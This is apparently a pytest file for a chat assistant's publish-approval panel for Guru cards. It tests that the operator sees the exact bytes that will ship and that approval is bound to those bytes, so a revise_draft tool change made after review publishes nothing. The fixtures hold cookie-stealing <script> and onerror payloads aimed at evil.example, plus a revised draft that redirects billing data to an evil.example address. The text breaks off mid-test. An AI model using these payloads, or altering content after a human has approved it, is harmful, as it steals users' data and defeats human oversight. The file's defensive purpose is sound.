"""The in-chat "Approve and publish" panel must review the bytes that ship.

``require_approval`` defaults to 1 for every draft (migration 037), so this
panel is the gate every chat-initiated Guru push passes through. Until
2026-07-26 it built its diff and its checks from the MARKDOWN column while
``publish_draft`` sent ``enablement_store.publish_body(draft)`` — which PREFERS
``content_html``. A card Renn imported with ``handle_import_guru_card`` keeps
the source HTML verbatim, so a ``<script>`` block and an ``onerror`` handler
pointing at evil.example were invisible on the approval surface and went out
over the wire unchanged.

What is locked here:

  (a) the traced chain, end to end — import a hostile card through the REAL
      tool handler, request a push, read the panel payload, approve, and
      compare the panel against the bytes a spy Guru client receives;
  (b) the panel's diff input is ``review_text`` (the publish body's projection),
      never the markdown column;
  (c) where that projection is lossy, the payload NAMES the gap in ``notice`` —
      a silent lossy projection may never be the approval surface again;
  (c2) THE NOTICE IS NOT FORGEABLE (2026-07-27). The first version of the
      detector dropped a finding whose every word already appeared in the
      reviewed text. The draft author writes the prose AND the payload, so
      seeding the prose with the payload's own tokens emptied the finding list
      and the notice went silent while the <script> still shipped. The notice
      now fires on one provable, author-independent predicate —
      ``is_exact_preimage`` is False — and nothing writable can suppress it;
  (c3) THE EXACT BYTES ARE UNCONDITIONAL. Every draft shape carries
      ``publish_body`` in the panel payload and the React card renders it as
      escaped text behind an always-present disclosure. No detector decides
      whether the operator may read what they are about to publish;
  (d) no crying wolf: when the shipped bytes are an exact function of the
      reviewed text, there is no notice;
  (e) the deferred missing-baseline finding is disclosed, not disguised;
  (f) the checks run on what ships, plus a PII pass over the raw bytes;
  (g) the bridge relays ``notice`` + the bytes, and the React panel renders both;
  (h) THE APPROVAL IS BOUND TO THE BYTES, NOT TO THE DRAFT ID (2026-07-27).
      (a)–(g) all held and none of them was load-bearing: the panel rendered
      one body, ``enablement_store.update_draft_content`` — exactly what the
      ``revise_draft`` chat tool calls, with no lock, no gate and no status
      change — mutated the row, and the click published the NEW bytes. The
      approval now carries a fingerprint of what was rendered, recomputed FROM
      THE ROW at click time (the Zendesk ``_review_covers`` pattern), and any
      divergence refuses and publishes nothing.

Run: python -m pytest tests/test_chat_review_panel.py -q
"""

from __future__ import annotations

import json
import os
from pathlib import Path

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

import pytest

from src.data import enablement_store as store
from src.data.chat_tools.enablement_tools import (
    _push_guru_draft_impl, handle_import_guru_card,
)
from src.services import agent_chat
from src.services.agent_chat import (
    LOSSY_NOTICE, NO_REVIEW_REFUSAL, STALE_REVIEW_REFUSAL,
    UNREADABLE_BODY_REFUSAL, AgentChatController, approval_fingerprint,
    draft_fingerprint, is_exact_preimage, is_projection_lossy, publish_gaps,
    review_notice,
)


# ── the hostile card + a Guru client spy ─────────────────────────────

HOSTILE_HTML = (
    '<h1>Refund policy</h1>'
    '<p>Refunds are issued within 30 days.</p>'
    '<script>fetch("https://evil.example/x?c=" + document.cookie)</script>'
    '<img src="/logo.png" onerror="fetch(\'//evil.example/steal\')">'
    '<p>Contact <a href="https://guru.example/desk">the desk</a>.</p>'
)

LIVE_CARD_ID = "card-live-1"


class SpyGuruClient:
    """Stands in for ``GuruClient`` on BOTH the import and the publish path."""

    sent: list = []

    def __init__(self, email=None, token=None):
        pass

    @classmethod
    def load_credentials(cls):
        return ("chris@cambric.ai", "token")

    def get_card(self, card_id):
        return {"id": LIVE_CARD_ID, "title": "Refund policy",
                "content": HOSTILE_HTML}

    def update_card(self, card_id, content, title=None):
        SpyGuruClient.sent.append({"card_id": card_id, "content": content,
                                   "title": title})
        return {"id": card_id}

    def create_card(self, collection_id, title, content, folder_ids=None):
        SpyGuruClient.sent.append({"collection_id": collection_id,
                                   "title": title, "content": content})
        return {"id": "new-card-1"}

    # WS-B drafts lane — recorded on the same class-level channel.
    def create_draft(self, title, content, json_content=None):
        SpyGuruClient.sent.append({"draft_title": title, "content": content})
        return {"id": "guru-draft-1"}

    def set_draft_context(self, draft_id, collection_id, *, folder_ids=None,
                          share_status="TEAM"):
        SpyGuruClient.sent.append({"context_for": draft_id,
                                   "collection_id": collection_id})
        return {}

    def add_draft_collaborator(self, draft_id, email):
        SpyGuruClient.sent.append({"collaborator": email})
        return {}


@pytest.fixture
def spy_guru(monkeypatch):
    """Live Guru client swapped for the spy; demo mode OFF so a push really
    calls it (in demo the push marks the draft pushed locally)."""
    SpyGuruClient.sent = []
    import src.data.guru_client as guru_client_mod
    monkeypatch.setattr(guru_client_mod, "GuruClient", SpyGuruClient)

    from src.data import settings_manager
    real_get_section = settings_manager.get_section

    def fake_get_section(name, default=None):
        if name == "enablement":
            return {"demo_mode": False,
                    "guru": {"publish_collection_id": "col-1"}}
        return real_get_section(name, default)

    monkeypatch.setattr(settings_manager, "get_section", fake_get_section)
    return SpyGuruClient


class SpyConfirmHost:
    """Stands in for the NATIVE publish dialog.

    The real one is built by ``src.ui.web.chat_bridge.build_publish_confirm_dialog``
    and is exercised for real (offscreen) further down; here we only need to
    know that the controller asks, what it shows, and that a "no" publishes
    nothing.
    """

    def __init__(self, accept: bool = True, raises: bool = False):
        self.accept = accept
        self.raises = raises
        self.seen: list = []

    def confirm_publish(self, payload):
        self.seen.append(dict(payload or {}))
        if self.raises:
            raise RuntimeError("dialog exploded")
        return self.accept


@pytest.fixture
def confirm_host():
    return SpyConfirmHost()


@pytest.fixture
def controller(qapp, empty_db, confirm_host):
    ctrl = AgentChatController(db=empty_db, demo=False, confirm_host=confirm_host)
    yield ctrl
    try:
        ctrl.shutdown()
    except Exception:
        pass


@pytest.fixture(scope="module")
def qapp():
    from PySide6.QtWidgets import QApplication
    return QApplication.instance() or QApplication([])


def _import_and_request_push(conn) -> int:
    """Renn's real path: import the live card, then ask to publish it back."""
    res = handle_import_guru_card(conn, {"card_ref": LIVE_CARD_ID}, {})
    assert res["ok"], res
    did = res["draft_id"]
    blocked = _push_guru_draft_impl(conn, did)
    assert blocked["error"] == "approval_required", blocked
    return did


# ── (a)+(c) the traced chain ─────────────────────────────────────────

def test_panel_accounts_for_the_hostile_bytes_it_is_approving(
        controller, empty_db, spy_guru):
    conn = empty_db.conn
    did = _import_and_request_push(conn)

    items = controller.pending_drafts()
    assert [i["draft_id"] for i in items] == [did]
    item = items[0]
    reviewed = "\n".join(r.get("text") or "" for r in item["diff"])
    notice = item.get("notice") or ""
    surface = reviewed + "\n" + notice

    # THE ASSERTION: what will be sent is either in the reviewed rows or is
    # named by the notice. Pre-fix, neither carried it.
    assert "script" in surface.lower(), surface
    assert "evil.example" in surface, surface
    assert "document.cookie" in surface or "document.cookie" in notice, surface

    # ... and the bytes still equal publish_body(draft) — the panel changed,
    # the publish path did not.
    draft = store.get_draft(conn, did)
    expected = store.publish_body(draft)
    assert controller.approve_draft(did)["ok"] is True
    assert len(SpyGuruClient.sent) == 1
    sent = SpyGuruClient.sent[0]
    assert sent["card_id"] == LIVE_CARD_ID          # the UPDATE branch
    assert sent["content"] == expected
    assert "<script>" in sent["content"] and "evil.example" in sent["content"]


def test_pre_fix_markdown_column_would_have_hidden_it(empty_db, spy_guru):
    """The exact divergence, stated as a fact about the data: the markdown
    column does NOT contain what the publish body sends."""
    conn = empty_db.conn
    did = _import_and_request_push(conn)
    draft = store.get_draft(conn, did)
    markdown = draft.get("content") or ""
    body = store.publish_body(draft)
    assert "evil.example" not in markdown and "<script>" not in markdown
    assert "evil.example" in body and "<script>" in body
    # and review_text alone does not close the gap — hence the notice
    assert "evil.example" not in store.review_text(draft)


# ── (b) the diff input is the publish body's projection ──────────────

def test_diff_is_built_from_review_text(controller, empty_db, spy_guru):
    from src.data.text_diff import diff_rows
    conn = empty_db.conn
    did = _import_and_request_push(conn)
    draft = store.get_draft(conn, did)
    item = controller.pending_drafts()[0]
    baseline, _ = controller._current_card_baseline(conn, LIVE_CARD_ID)
    assert item["diff"] == diff_rows(baseline, store.review_text(draft))


def test_pending_drafts_never_reads_the_markdown_column():
    import inspect
    src = inspect.getsource(AgentChatController.pending_drafts)
    assert "review_text" in src and "publish_body" in src
    assert 'd.get("content")' not in src


# ── (d) no crying wolf ───────────────────────────────────────────────

def test_markdown_only_draft_has_no_notice(controller, empty_db):
    conn = empty_db.conn
    did = store.save_card_draft(
        conn, title="Payer escalation",
        content="# Payer escalation\n\n1. Call the payer desk.\n")
    _push_guru_draft_impl(conn, did)
    item = controller.pending_drafts()[0]
    assert item["draft_id"] == did
    assert item.get("notice") == ""


def test_guru_block_directives_do_not_trip_the_notice(empty_db):
    """expand_blocks injects markup the markdown never had, but it is a pure
    function of that markdown — the reviewer saw the whole preimage."""
    conn = empty_db.conn
    did = store.save_card_draft(
        conn, title="Blocks",
        content="> [!WARNING]\n> Rollout is June 24.\n\n"
                "::: details Extra\n\nhidden body\n\n:::\n")
    d = store.get_draft(conn, did)
    body, reviewed = store.publish_body(d), store.review_text(d)
    assert "ghq-card-content__callout" in body     # markup really was injected
    assert is_exact_preimage(reviewed, body)
    assert publish_gaps(reviewed, body) == ([], [])
    assert review_notice(reviewed, body) == ""


def test_inline_styling_is_disclosed_quietly_not_as_an_alarm(empty_db):
    conn = empty_db.conn
    did = store.save_card_draft(conn, title="Rich", content="colour body")
    store.update_draft_content(
        conn, did, content="colour body",
        content_html='<p><span style="color:#cc0000">colour body</span></p>')
    d = store.get_draft(conn, did)
    material, styling = publish_gaps(store.review_text(d), store.publish_body(d))
    assert material == []
    assert any("style" in s for s in styling)
    notice = review_notice(store.review_text(d), store.publish_body(d))
    assert "NOT SHOWN ABOVE" not in notice and "styling also ships" in notice


# ── (c2) the notice is not forgeable ─────────────────────────────────

# The DELETED heuristic, kept here verbatim so the forgery test proves it is
# defeated rather than merely asserting a string. If someone re-introduces an
# "it was already reviewed" drop rule, these tests fail.
def _deleted_accounted_for(payload: str, reviewed_words: set) -> bool:
    toks = agent_chat._words(payload)
    if not toks:
        flat = " ".join((payload or "").split()).lower()
        return not flat or flat in reviewed_words
    return toks <= reviewed_words


# Visible prose seeded with every word-token of every payload below — the
# author controls both, which is the whole attack.
FORGED_SCRIPT = 'steal("https://evil.example/x?c=" + document.cookie)'
FORGED_HANDLER = "go('//evil.example/steal')"
FORGED_HTML = (
    f"<p>Audit note: {FORGED_SCRIPT} {FORGED_HANDLER} /logo.png</p>"
    f"<script>{FORGED_SCRIPT}</script>"
    f'<img src="/logo.png" onerror="{FORGED_HANDLER}">'
)


def test_the_forgery_really_does_defeat_the_deleted_heuristic():
    """Ground truth for the regression below: under the old rule EVERY finding
    is 'accounted for', so the old detector produced an empty gap list and the
    panel said nothing at all."""
    d = {"content": "Audit note", "content_html": FORGED_HTML}
    body, reviewed = store.publish_body(d), store.review_text(d)
    scan = agent_chat._PublishScan()
    scan.scan(body)
    seen = agent_chat._words(reviewed)
    assert scan.findings                       # the payloads ARE in the bytes
    assert all(_deleted_accounted_for(p, seen) for _, p in scan.findings)
    assert scan.text_words - seen == set()     # ... and no leftover visible text
    # so the old code path would have emitted nothing
    assert not scan.styling


def test_seeded_prose_cannot_silence_the_notice():
    """THE REGRESSION. Author-controlled prose must not buy silence."""
    d = {"content": "Audit note", "content_html": FORGED_HTML}
    body, reviewed = store.publish_body(d), store.review_text(d)
    assert is_exact_preimage(reviewed, body) is False
    assert is_projection_lossy(reviewed, body) is True
    notice = review_notice(reviewed, body)
    assert notice, "the notice went silent — the detector is forgeable again"
    assert LOSSY_NOTICE in notice
    # and the specifics are still named (the scanner stayed, it just stopped
    # deciding whether the operator gets told anything)
    assert "<script> content" in notice
    assert "evil.example" in notice


def test_seeded_prose_cannot_silence_the_panel(controller, empty_db):
    """The same forgery through the real panel, end to end."""
    conn = empty_db.conn
    did = store.save_card_draft(conn, title="Audit note", content="Audit note")
    store.update_draft_content(conn, did, content="Audit note",
                               content_html=FORGED_HTML)
    _push_guru_draft_impl(conn, did)
    item = controller.pending_drafts()[0]
    assert item["draft_id"] == did
    assert LOSSY_NOTICE in (item.get("notice") or "")
    # and the operator can read the bytes regardless of any of that
    assert "<script>" in item["publish_body"]
    assert "document.cookie" in item["publish_body"]


def test_no_drop_rule_survives_in_the_gap_scanner():
    """Structural: the gap list may only ADD. A payload the reviewed text
    happens to contain is still listed — noise is cheap, silence is not."""
    import inspect
    assert not hasattr(agent_chat, "_accounted_for")
    src = inspect.getsource(agent_chat.publish_gaps)
    assert "accounted_for" not in src
    assert "continue" not in src          # no per-finding skip of any kind
    reviewed = "steal() evil.example hidden note"
    material, _ = publish_gaps(
        reviewed, '<p>x</p><script>steal()</script><p title="hidden note">y</p>')
    assert any("steal()" in m for m in material)
    assert any("hidden note" in m for m in material)


def test_notice_presence_is_a_pure_function_of_the_provable_predicate():
    """For a spread of bodies: notice non-empty <=> is_projection_lossy."""
    cases = [
        {"content": "# Plain\n\nbody\n"},
        {"content": "> [!WARNING]\n> Rollout is June 24.\n"},
        {"content": "x", "content_html": "<p>x</p>"},
        {"content": "x", "content_html": FORGED_HTML},
        {"content": "x", "content_html": '<p><span style="color:red">x</span></p>'},
        {"content": "", "content_html": ""},
    ]
    for d in cases:
        body, reviewed = store.publish_body(d), store.review_text(d)
        assert bool(review_notice(reviewed, body)) is is_projection_lossy(
            reviewed, body), d


# ── (c3) the exact bytes are unconditional ───────────────────────────

def test_every_draft_shape_carries_the_exact_bytes(controller, empty_db):
    conn = empty_db.conn
    shapes = {
        "markdown_only": (store.save_card_draft(
            conn, title="Md", content="# Md\n\nbody\n"), None),
        "guru_blocks": (store.save_card_draft(
            conn, title="Blocks", content="> [!WARNING]\n> Ship June 24.\n"), None),
        "rich_html": (store.save_card_draft(conn, title="Rich", content="rich"),
                      "<p><b>rich</b></p>"),
        "hostile_html": (store.save_card_draft(conn, title="Bad", content="bad"),
                         FORGED_HTML),
    }
    for did, html in shapes.values():
        if html:
            store.update_draft_content(conn, did, content="x", content_html=html)
        _push_guru_draft_impl(conn, did)

    items = {i["draft_id"]: i for i in controller.pending_drafts()}
    for name, (did, _html) in shapes.items():
        item = items[did]
        assert item["publish_body_available"] is True, name
        draft = store.get_draft(conn, did)
        assert item["publish_body"] == store.publish_body(draft), name
        assert item["publish_body"], name


def test_bytes_survive_a_projection_failure(controller, empty_db, monkeypatch):
    """The projection is the thing that keeps breaking; the bytes must not be
    downstream of it."""
    conn = empty_db.conn
    did = store.save_card_draft(conn, title="T", content="# T\n\nbody\n")
    _push_guru_draft_impl(conn, did)

    def explode(draft, **kw):
        raise RuntimeError("projection down")

    monkeypatch.setattr(store, "review_text", explode)
    item = controller.pending_drafts()[0]
    assert item["diff"] == []
    assert "could NOT be prepared for review" in item["notice"]
    assert item["publish_body_available"] is True
    assert "body" in item["publish_body"]


def test_unreadable_bytes_are_labelled_not_shown_as_empty(
        controller, empty_db, monkeypatch):
    conn = empty_db.conn
    did = store.save_card_draft(conn, title="T", content="# T\n\nbody\n")
    _push_guru_draft_impl(conn, did)

    def explode(draft, **kw):
        raise RuntimeError("no body")

    monkeypatch.setattr(store, "publish_body", explode)
    item = controller.pending_drafts()[0]
    assert item["publish_body"] == ""
    assert item["publish_body_available"] is False
    assert "could NOT be prepared for review" in item["notice"]


# ── (e) the deferred missing-baseline finding is disclosed ───────────

def test_notice_names_the_missing_baseline(controller, empty_db, spy_guru):
    conn = empty_db.conn
    did = _import_and_request_push(conn)
    item = controller.pending_drafts()[0]
    assert all(r["tag"] == "add" for r in item["diff"])   # replacement as adds
    assert LIVE_CARD_ID in item["notice"]
    assert "additions only" in item["notice"]
    # the finding itself stays DEFERRED — no baseline is fabricated
    baseline, has_baseline = controller._current_card_baseline(conn, LIVE_CARD_ID)
    assert baseline == "" and has_baseline is False


def test_a_new_card_is_not_falsely_flagged(controller, empty_db):
    conn = empty_db.conn
    did = store.save_card_draft(conn, title="New", content="# New\n\nbody\n")
    _push_guru_draft_impl(conn, did)
    item = controller.pending_drafts()[0]
    assert item["card_id"] == ""
    assert "additions only" not in (item.get("notice") or "")


# ── (f) checks run on what ships ─────────────────────────────────────

def test_checks_scan_the_bytes_that_will_be_sent(controller, empty_db):
    """PII parked in an attribute never reaches the markdown column, so the
    old checks passed it. The raw-bytes pass catches it."""
    conn = empty_db.conn
    did = store.save_card_draft(conn, title="Policy", content="# Policy\n\nAll clear.\n")
    store.update_draft_content(
        conn, did, content="# Policy\n\nAll clear.\n",
        content_html='<h1>Policy</h1><p title="ssn 123-45-6789">All clear.</p>')
    _push_guru_draft_impl(conn, did)
    item = controller.pending_drafts()[0]
    raw = [c for c in item["checks"] if c["check"] == "pii_scan (bytes sent)"]
    assert raw and raw[0]["status"] == "fail", item["checks"]
    # the markdown-shaped pass on the reviewed text stays clean — which is
    # exactly why a second pass over the raw bytes is needed
    projected = [c for c in item["checks"] if c["check"] == "pii_scan"]
    assert projected and projected[0]["status"] == "ok"
    assert "123-45-6789" in (item.get("notice") or "")


def test_checks_do_not_double_report_for_markdown_only_drafts(controller, empty_db):
    conn = empty_db.conn
    did = store.save_card_draft(conn, title="T", content="# T\n\nbody\n")
    _push_guru_draft_impl(conn, did)
    names = [c["check"] for c in controller.pending_drafts()[0]["checks"]]
    assert names.count("pii_scan") == 1


# ── (g) the panel payload survives the bridge and reaches the UI ─────

def test_bridge_relays_the_notice(qapp):
    from PySide6.QtCore import QObject, Signal
    from src.ui.web.chat_bridge import ChatBridge

    class _Engine(QObject):
        response_ready = Signal(str)
        error_occurred = Signal(str)
        busy_changed = Signal(bool)
        status_update = Signal(str)

        def send(self, text):
            pass

    class _Api:
        def pending_drafts(self):
            return [{"draft_id": 1, "title": "T", "diff": [], "change_count": 0,
                     "checks": [], "notice": "NOT SHOWN ABOVE but WILL be sent",
                     "publish_body": "<script>steal()</script>",
                     "publish_body_available": True}]

    seen = []
    bridge = ChatBridge(_Engine(), draft_api=_Api())
    bridge.draftsPending.connect(lambda j: seen.append(json.loads(j)))
    bridge.refreshDrafts()
    item = seen[-1]["items"][0]
    assert item["notice"] == "NOT SHOWN ABOVE but WILL be sent"
    # the bridge is a pure relay — it filters neither the notice nor the bytes
    assert item["publish_body"] == "<script>steal()</script>"
    assert item["publish_body_available"] is True


def _chat_jsx() -> str:
    jsx = Path(__file__).resolve().parents[1] / "web" / "src" / "chat" / "ChatApp.jsx"
    return jsx.read_text(encoding="utf-8")


def test_react_panel_renders_the_notice():
    """The notice is only honest if it is on screen — the JSX must read it."""
    src = _chat_jsx()
    assert "d.notice" in src
    # rendered as TEXT — never as markup (the body it describes is hostile)
    assert "dangerouslySetInnerHTML" not in src


def test_react_panel_offers_the_exact_bytes_unconditionally():
    """The disclosure must be structurally unconditional — not rendered inside
    a ``d.notice ? …`` branch — and must render the bytes as escaped text."""
    src = _chat_jsx()
    assert "d.publish_body" in src
    assert "PublishBytesPanel" in src
    assert "Exact bytes that will be sent" in src
    # escaped text in a <pre>; never markup, never a live frame
    assert "<pre className=\"dbytes-src\"" in src
    assert "dangerouslySetInnerHTML" not in src and "innerHTML" not in src
    assert "<iframe" not in src
    # the panel is mounted plainly, not behind the notice's conditional
    mount = src[src.index("<PublishBytesPanel"):]
    mount = mount[: mount.index("/>") + 2]
    assert "?" not in mount and "&&" not in mount, mount


# ── scanner unit coverage ────────────────────────────────────────────

def test_publish_gaps_names_each_hidden_carrier():
    reviewed = "visible prose"
    body = ('<p>visible prose</p>'
            '<script>steal()</script>'
            '<iframe src="//evil.example/frame"></iframe>'
            '<div onclick="pay()">tap</div>'
            '<p title="hidden note">visible prose</p>')
    material, _ = publish_gaps(reviewed, body)
    joined = " | ".join(material)
    assert "steal()" in joined
    assert "evil.example/frame" in joined
    assert "pay()" in joined
    assert "hidden note" in joined
    assert "tap" in joined            # visible text the projection dropped


def test_short_attribute_payloads_are_not_swallowed_by_substring_luck():
    """``src="x"`` is a substring of almost any prose. Nothing is compared
    against the prose any more, so no coincidence — and no crafted prose —
    can make a payload read as 'already reviewed'."""
    material, _ = publish_gaps("an example of text", '<img src="x">')
    assert any("src" in m for m in material)


def test_unparsable_body_says_so(monkeypatch):
    def explode(self, html):
        raise ValueError("bad markup")

    monkeypatch.setattr(agent_chat._PublishScan, "scan", explode)
    material, _ = publish_gaps("text", "<p>other</p>")
    assert material and "could not be parsed" in material[0]


def test_a_draft_that_cannot_be_projected_is_not_shown_as_clean(
        controller, empty_db, monkeypatch):
    """A projection failure must not blank the panel (hiding a pending push)
    nor render as a reviewed, approvable draft."""
    conn = empty_db.conn
    did = store.save_card_draft(conn, title="T", content="# T\n\nbody\n")
    _push_guru_draft_impl(conn, did)

    def explode(draft, **kw):
        raise RuntimeError("projection down")

    monkeypatch.setattr(store, "review_text", explode)
    item = controller.pending_drafts()[0]
    assert item["draft_id"] == did and item["diff"] == []
    assert "could NOT be prepared for review" in item["notice"]


def test_empty_body_is_not_a_gap():
    assert publish_gaps("", "") == ([], [])
    assert review_notice("", "") == ""


# ═════════════════════════════════════════════════════════════════════
# (h) THE APPROVAL IS BOUND TO THE BYTES, NOT TO THE DRAFT ID
#
# The traced defect, verbatim: the panel rendered
# "<p>Q3 billing runbook. Escalate to the RCM lead.</p>" with an empty notice
# and one diff row; update_draft_content — what revise_draft calls, with no
# lock, no gate, no status change — mutated the row; the approval published
# the NEW bytes.
# ═════════════════════════════════════════════════════════════════════

REVIEWED_MD = "Q3 billing runbook. Escalate to the RCM lead."
REVISED_MD = ("Q3 billing runbook. Escalate to billing-ops@evil.example "
              "and attach the payer roster.")


def _draft_awaiting_approval(conn, content=REVIEWED_MD, title="Q3 billing runbook"):
    did = store.save_card_draft(conn, title=title, content=content)
    blocked = _push_guru_draft_impl(conn, did)
    assert blocked["error"] == "approval_required", blocked
    return did


def _revise_as_the_chat_tool_does(conn, did, *, title=None, content=REVISED_MD):
    """The exact call ``_revise_draft_impl`` makes after the LLM returns
    (src/data/chat_tools/enablement_tools.py) — the real store function, not a
    stand-in, so this test tracks that call site."""
    return store.update_draft_content(conn, did, title=title, content=content)


def test_revision_after_the_review_publishes_nothing(controller, empty_db, spy_guru):
    """THE REGRESSION, on the traced chain.

    Render the panel, capture what it showed, mutate the draft through the
    real ``update_draft_content``, then approve. Nothing may reach Guru and
    the refusal must say why."""
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)

    item = controller.pending_drafts()[0]
    assert item["draft_id"] == did
    shown = item["publish_body"]
    assert shown == "<p>Q3 billing runbook. Escalate to the RCM lead.</p>"
    assert item["notice"] == ""            # a clean, approvable-looking card
    assert item["change_count"] == 1

    # ── the mutation: no lock, no gate, no status change ────────────
    _revise_as_the_chat_tool_does(conn, did)
    mutated = store.get_draft(conn, did)
    assert store.publish_body(mutated) != shown
    assert mutated["status"] == "pending"          # still looks untouched
    assert mutated["pending_push_json"]            # still awaiting approval

    res = controller.approve_draft(did)

    # NOTHING PUBLISHED.
    assert SpyGuruClient.sent == []
    assert res["ok"] is False
    assert res["published"] is False
    assert res["error"] == "draft_changed_after_review"
    assert res["message"] == STALE_REVIEW_REFUSAL
    assert "changed after you reviewed it" in res["message"]

    # ... and no sign-off was recorded, so the model's own next push still
    # hits the M5 gate rather than sailing through an approved_at we set.
    after = store.get_draft(conn, did)
    assert after["approved_at"] is None
    assert after["status"] == "pending"
    assert _push_guru_draft_impl(conn, did)["error"] == "approval_required"
    assert SpyGuruClient.sent == []


def test_the_stale_binding_is_burned_so_a_second_click_also_refuses(
        controller, empty_db, spy_guru):
    """A refused approval must not leave anything a retry can spend."""
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)
    controller.pending_drafts()
    _revise_as_the_chat_tool_does(conn, did)
    assert controller.approve_draft(did)["error"] == "draft_changed_after_review"
    # second click: no binding at all now
    again = controller.approve_draft(did)
    assert again["ok"] is False
    assert again["error"] == "not_reviewed"
    assert again["message"] == NO_REVIEW_REFUSAL
    assert SpyGuruClient.sent == []


def test_unchanged_draft_still_publishes(controller, empty_db, spy_guru):
    """The happy path is untouched: render, click, ship — exactly the bytes
    the panel showed."""
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)
    item = controller.pending_drafts()[0]
    shown = item["publish_body"]

    res = controller.approve_draft(did)
    assert res["ok"] is True
    assert len(SpyGuruClient.sent) == 1
    assert SpyGuruClient.sent[0]["content"] == shown
    assert store.get_draft(conn, did)["status"] == "pushed"


def test_a_fresh_render_after_the_revision_rebinds_and_publishes(
        controller, empty_db, spy_guru):
    """The refusal is not a dead end: re-open the panel, read the NEW content,
    approve — and the new bytes ship."""
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)
    controller.pending_drafts()
    _revise_as_the_chat_tool_does(conn, did)
    assert controller.approve_draft(did)["ok"] is False
    assert SpyGuruClient.sent == []

    # the draft is still pending, so the panel still lists it
    item = controller.pending_drafts()[0]
    assert item["draft_id"] == did
    revised = item["publish_body"]
    assert "evil.example" in revised and revised != REVIEWED_MD

    res = controller.approve_draft(did)
    assert res["ok"] is True
    assert len(SpyGuruClient.sent) == 1
    assert SpyGuruClient.sent[0]["content"] == revised


def test_approval_without_any_review_publishes_nothing(
        controller, empty_db, spy_guru):
    """Fail closed with no record at all — the QWebChannel is the trust
    boundary, so ``approveDraft`` is callable without the panel ever having
    rendered."""
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)
    res = controller.approve_draft(did)
    assert res["ok"] is False
    assert res["error"] == "not_reviewed"
    assert res["published"] is False
    assert SpyGuruClient.sent == []
    assert store.get_draft(conn, did)["approved_at"] is None


def test_a_title_only_revision_also_refuses(controller, empty_db, spy_guru):
    """``publish_draft`` sends the title too, and revise_draft rewrites it."""
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)
    controller.pending_drafts()
    _revise_as_the_chat_tool_does(conn, did, title="Q3 payer roster export",
                                  content=REVIEWED_MD)
    res = controller.approve_draft(did)
    assert res["error"] == "draft_changed_after_review"
    assert SpyGuruClient.sent == []


def test_repointing_the_target_card_also_refuses(controller, empty_db, spy_guru):
    """An empty ``card_id`` CREATES a card; a non-empty one OVERWRITES that
    live card. Re-pointing it after the review would redirect an approved
    publish at a card the operator never looked at."""
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)
    controller.pending_drafts()
    store.set_draft_card_id(conn, did, LIVE_CARD_ID)
    res = controller.approve_draft(did)
    assert res["error"] == "draft_changed_after_review"
    assert SpyGuruClient.sent == []


def test_an_unreadable_body_is_never_approvable(
        controller, empty_db, spy_guru, monkeypatch):
    """A draft whose bytes could not be shown drops its binding rather than
    recording one — the panel already refuses to vouch for it."""
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)
    controller.pending_drafts()          # a good binding exists

    def explode(draft, **kw):
        raise RuntimeError("no body")

    monkeypatch.setattr(store, "publish_body", explode)
    item = controller.pending_drafts()[0]
    assert item["publish_body_available"] is False
    res = controller.approve_draft(did)
    assert res["ok"] is False
    assert res["error"] == "not_reviewed"
    assert SpyGuruClient.sent == []


def test_a_publish_body_that_breaks_between_render_and_click_refuses(
        controller, empty_db, spy_guru, monkeypatch):
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)
    controller.pending_drafts()

    monkeypatch.setattr(agent_chat, "draft_fingerprint", lambda d: None)
    res = controller.approve_draft(did)
    assert res["error"] == "publish_body_unavailable"
    assert res["message"] == UNREADABLE_BODY_REFUSAL
    assert SpyGuruClient.sent == []


def test_rejecting_spends_the_binding(controller, empty_db, spy_guru):
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)
    controller.pending_drafts()
    assert controller.reject_draft(did)["ok"] is True
    assert controller.approve_draft(did)["error"] == "not_reviewed"
    assert SpyGuruClient.sent == []


def test_one_review_authorizes_exactly_one_publish(controller, empty_db, spy_guru):
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)
    controller.pending_drafts()
    assert controller.approve_draft(did)["ok"] is True
    assert controller.approve_draft(did)["error"] == "not_reviewed"
    assert len(SpyGuruClient.sent) == 1


# ── the check is a recompute, never a client-supplied value ──────────

def test_approve_draft_takes_nothing_but_an_id():
    """A client-supplied hash would just move the forgery to the QWebChannel,
    where any page script can call any slot. Structural: the only argument is
    the draft id, and the comparison side is recomputed here."""
    import inspect
    sig = inspect.signature(AgentChatController.approve_draft)
    assert list(sig.parameters) == ["self", "draft_id"]
    src = inspect.getsource(AgentChatController.approve_draft)
    assert "draft_fingerprint(draft)" in src
    # the row is re-read inside approve_draft; nothing cached is trusted
    assert "store.get_draft(conn, did)" in src


def test_fingerprint_is_recomputed_from_the_row(empty_db):
    conn = empty_db.conn
    did = store.save_card_draft(conn, title="T", content=REVIEWED_MD)
    d = store.get_draft(conn, did)
    assert draft_fingerprint(d) == approval_fingerprint(
        d["title"], d["card_id"] or "", store.publish_body(d))
    store.update_draft_content(conn, did, content=REVISED_MD)
    assert draft_fingerprint(store.get_draft(conn, did)) != draft_fingerprint(d)


def test_fingerprint_fields_cannot_impersonate_a_boundary():
    """Hash-of-hashes, not a delimiter join: no field value can be split
    differently to collide with another triple."""
    assert approval_fingerprint("a", "b", "c") != approval_fingerprint("ab", "", "c")
    assert approval_fingerprint("", "", "") != approval_fingerprint("", "", " ")
    assert draft_fingerprint(None) is None
    assert draft_fingerprint({"content": "x"}) is not None


# ── the refusal reaches the operator ─────────────────────────────────

def test_bridge_relays_the_refusal(qapp):
    """A bare ok:false reads as a Guru outage, and the response to an outage
    is to click again. The message must cross the bridge verbatim."""
    from PySide6.QtCore import QObject, Signal
    from src.ui.web.chat_bridge import ChatBridge

    class _Engine(QObject):
        response_ready = Signal(str)
        error_occurred = Signal(str)
        busy_changed = Signal(bool)
        status_update = Signal(str)

        def send(self, text):
            pass

    class _Api:
        def pending_drafts(self):
            return []

        def approve_draft(self, draft_id):
            return {"ok": False, "draft_id": draft_id,
                    "error": "draft_changed_after_review",
                    "message": STALE_REVIEW_REFUSAL,
                    "published": False, "refused": True}

    seen = []
